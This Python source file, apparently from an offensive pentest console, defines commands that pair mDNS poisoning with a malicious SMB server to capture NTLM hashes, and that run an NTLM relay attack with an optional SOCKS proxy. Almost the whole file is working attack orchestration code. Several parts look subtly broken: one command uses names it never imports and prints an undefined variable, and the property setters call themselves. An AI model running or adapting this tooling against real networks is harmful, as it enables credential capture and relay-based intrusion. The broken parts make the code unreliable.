from cmd2.command_definition import with_default_category
from cmd2 import CommandSet, with_default_category, Cmd2ArgumentParser, with_argparser
import argparse

from .servers.smbserver import MaliciousSmbServer, NtlmRelayAttack
from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS
from .Poison import MDNS
from multiprocessing import Process
from threading import Thread
import sys
import os
import signal
from cmd2 import ansi
import cmd2
import logging
from loguru import logger
from time import sleep


@with_default_category("Man in the middle attacks")
class SmbServerAttack(CommandSet):
    """[ Class containing smbrelay attack ]"""

    def __init__(self) -> None:

        super().__init__()

    def prueba(self):
        print("hola")

    def config_poison_and_server(
        self, mdns_poisoner: MDNS, smbserver: NtlmRelayAttack
    ) -> None:
        """[ Function to launch the threads that will control the mdns poisoner and the smb server]

        Args:
            mdns_poisoner (MDNS): [ variable with the mdns poisoner Object ]
            smbserver (SmbServer): [ variable with the SmbServer Object ]
        """
        mdns_thread = Thread(target=mdns_poisoner.start_mdns_poisoning)
        mdns_thread.daemon = True

        smbserver_thread = Thread(target=smbserver.start_malicious_smbserver)
        smbserver_thread.daemon = True

        mdns_thread.start()
        smbserver_thread.start()

        # I only wait for a thread because when you finish the process you have to finish
        smbserver_thread.join()

    argParser = Cmd2ArgumentParser(
        description="""Malicious smb server attack to get hashes net-NTLMV """
    )
    argParser.add_argument(
        "-SS",
        "--show_settable",
        action="store_true",
        help="Show Settable variables for this command",
    )

    @with_argparser(argParser)
    def do_mss(self, args: argparse.Namespace) -> None:
        """[ Command to create a malicious smb server to get ntlm hashes ]

        Args:
            args (argparse.Namespace): [Arguments passed to the smb_relay command]
        """

        mdns_poisoner = MDNS(
            self._cmd.LHOST,
            self._cmd.IPV6,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
        )

        # output in case of -SS command
        smbserver = MaliciousSmbServer(self._cmd.LHOST, self._cmd.LPORT)

        self._cmd.info_logger.debug(
            f"""Starting malicious smb server attack using ip: {self._cmd.LHOST} ipv6:{self._cmd.IPV6}
            interface: {self._cmd.INTERFACE} mac_address:{self._cmd.MAC_ADDRESS} lport:{self._cmd.LPORT}"""
        )

        settable_variables_required = {
            "LHOST": self._cmd.LHOST,
            "IPV6": self._cmd.IPV6,
            "INTERFACE": self._cmd.INTERFACE,
            "MAC_ADDRESS": self._cmd.MAC_ADDRESS,
            "LPORT": self._cmd.LPORT,
        }
        if args.show_settable:
            self._cmd.show_settable_variables_necessary(settable_variables_required)
        elif self._cmd.check_settable_variables_value(settable_variables_required):

            attack = Process(
                target=self.config_poison_and_server, args=(mdns_poisoner, smbserver)
            )
            try:
                # If ctrl+c then the process terminate and smb_relay exits
                attack.start()
            except KeyboardInterrupt:
                attack.terminate()
                attack.join()
                self._cmd.error_logger.warning("Exiting smb relay attack ...")


@with_default_category("Man in the middle attacks")
class NtlmRelay(CommandSet):
    def __init__(self):
        super().__init__()
        self.__mdns_poisoner = None
        self.__ntlm_relay_attack = None
        self.__attack = None

    @property
    def mdns_poisoner(self) -> MDNS:
        return self.__mdns_poisoner

    @property
    def ntlm_relay_attack(self) -> NtlmRelayAttack:
        return self.__ntlm_relay_attack

    @mdns_poisoner.setter
    def mdns_poisoner(self, poisoner: MDNS) -> None:
        self.mdns_poisoner = poisoner

    @ntlm_relay_attack.setter
    def ntlm_relay_attack(self, attack: NtlmRelayAttack) -> None:
        self.ntlm_relay_attack = attack

    def try_exit(self, signum, frame):
        self._cmd.info_logger.debug("Block exit ...")

    def config_poison_and_server(self, args: argparse.Namespace) -> None:
        """[ Function to launch the threads that will control the mdns poisoner and the smb server]

        Args:
            mdns_poisoner (MDNS): [ variable with the mdns poisoner Object ]
            smbserver (SmbServer): [ variable with the SmbServer Object ]
        """
        if args.proxy:
            self.create_proxy()

        if args.Asynchronous:
            self.mdns_poisoner.logger_level = "DEBUG"
            signal.signal(signal.SIGINT, self.try_exit)
        mdns_thread = Thread(target=self.mdns_poisoner.start_mdns_poisoning)
        mdns_thread.daemon = True

        mdns_thread.start()
        self.ntlm_relay_attack.start_ntlm_relay_server()

    def synchronous_attack(self):
        try:
            self.__attack.join()
        except KeyboardInterrupt:
            self.__attack.terminate()
            self.__attack.join()
            self._cmd.error_logger.warning("Exiting smb relay attack ...")

    def asynchronous_attack(self) -> None:
        self._cmd.disable_command(
            "ntlm_relay",
            ansi.style(
                "The ntlm_relay command will be disabled while it is running",
                fg=ansi.fg.bright_yellow,
            ),
        )
        saved_file = ansi.style("logs/ntlm_relay.log", fg=ansi.fg.green)
        self._cmd.info_logger.info(
            f"Running ntlm relay on the background the results will be saved at: {saved_file} "
        )

    def create_proxy(self) -> None:
        server = SOCKS()
        server.daemon_threads = True
        server_thread = Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()

    argParser = Cmd2ArgumentParser(
        description="""Command to perform ntlm relay attack"""
    )
    argParser.add_argument(
        "-SS",
        "--show_settable",
        action="store_true",
        help="Show Settable variables for this command",
    )
    argParser.add_argument(
        "-A",
        "--Asynchronous",
        action="store_true",
        help="Perform the attack in the background. The results will be saved in log/ntlm_relay",
    )

    argParser.add_argument(
        "-P",
        "--proxy",
        action="store_true",
        help="Use a proxy server",
    )

    @with_argparser(argParser)
    def do_ntlm_relay(self, args: argparse.Namespace) -> None:
        """[ Command to perform ntlm relay attack ]

        Args:
            args (argparse.Namespace): [Arguments passed to the ntlm relay attack ]
        """

        self.__mdns_poisoner = MDNS(
            self._cmd.LHOST,
            self._cmd.IPV6,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
        )

        # output in case of -SS command
        self.__ntlm_relay_attack = NtlmRelayAttack(
            self._cmd.LHOST, self._cmd.LPORT, self._cmd.RHOST, args.Asynchronous
        )

        self._cmd.info_logger.debug(
            f"""Starting ntlm relay attack using lhost: {self._cmd.LHOST} rhost:{self._cmd.RHOST} ipv6:{self._cmd.IPV6}
            interface: {self._cmd.INTERFACE} mac_address:{self._cmd.MAC_ADDRESS} lport:{self._cmd.LPORT}"""
        )

        settable_variables_required = {
            "LHOST": self._cmd.LHOST,
            "RHOST": self._cmd.RHOST,
            "IPV6": self._cmd.IPV6,
            "INTERFACE": self._cmd.INTERFACE,
            "MAC_ADDRESS": self._cmd.MAC_ADDRESS,
            "LPORT": self._cmd.LPORT,
        }
        if args.show_settable:
            self._cmd.show_settable_variables_necessary(settable_variables_required)
        elif self._cmd.check_settable_variables_value(settable_variables_required):
            self.__attack = Process(target=self.config_poison_and_server, args=(args,))
            self.__attack.start()
            if not args.Asynchronous:
                self.synchronous_attack()
            else:
                self.asynchronous_attack()
                sleep(1)

    argParser = Cmd2ArgumentParser(description="Command to show actual connections")

    def do_show_connections(self, args: argparse.Namespace) -> None:
        url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
        try:
            handler = ProxyHandler({})
            open_handler = build_opener(handler)
            response = Request(url)
            r = open_handler.open(response)
            print(items)
        except Exception:
            self._cmd.error_logger.error("Error when opening connections")

    argParser = Cmd2ArgumentParser(
        description="""Command to stop ntlm relay attack in the background"""
    )

    def do_finish_ntlm_relay(self, args: argparse.Namespace) -> None:
        if self.__attack is not None and self.__attack.is_alive:
            self._cmd.info_logger.success(
                "Finishing ntlm relay attack in the background ..."
            )
            self.__attack.terminate()
            self.__attack.join()
            self._cmd.enable_command("ntlm_relay")
            self.__attack = None
        else:
            self._cmd.error_logger.error(
                "There is not ntlm_relay process in the background"
            )

    def ntlm_relay_postloop(self) -> None:
        if self.__attack is not None and self.__attack.is_alive:
            self.__attack.terminate()
            self.__attack.join()
